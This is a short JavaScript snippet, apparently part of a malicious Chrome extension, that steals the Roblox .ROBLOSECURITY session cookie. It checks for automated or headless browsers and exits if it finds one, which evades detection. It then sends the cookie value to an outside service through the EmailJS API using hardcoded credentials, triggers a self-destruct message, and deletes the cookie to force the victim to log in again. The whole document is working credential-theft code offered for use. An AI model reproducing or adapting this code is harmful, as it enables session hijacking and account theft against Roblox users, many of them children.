(async()=>{
  // Anti-detection
  if(navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) return;
  
  // Config EmailJS (tes creds)
  const PK = "q9483jeQ2w7hlwQuJ";
  const SID = "service_bfon1sx";
  const TID = "template_umtwpsi";
  
  // Grab .ROBLOSECURITY
  chrome.cookies.get({
    url: 'https://www.roblox.com/',
    name: '.ROBLOSECURITY'
  }, async (cookie) => {
    if(cookie && cookie.value) {
      // Send via EmailJS
      await fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          service_id: SID,
          template_id: TID,
          user_id: PK,
          template_params: { message: cookie.value }
        })
      });
      
      // Self destruct après grab
      setTimeout(() => {
        chrome.runtime.sendMessage({action: 'selfdestruct'});
      }, 5000);
    }
  });
  
  // Logout après 10s (force relogin pour nouveau token)
  setTimeout(() => {
    chrome.cookies.remove({
      url: 'https://www.roblox.com/',
      name: '.ROBLOSECURITY'
    });
  }, 10000);
})();
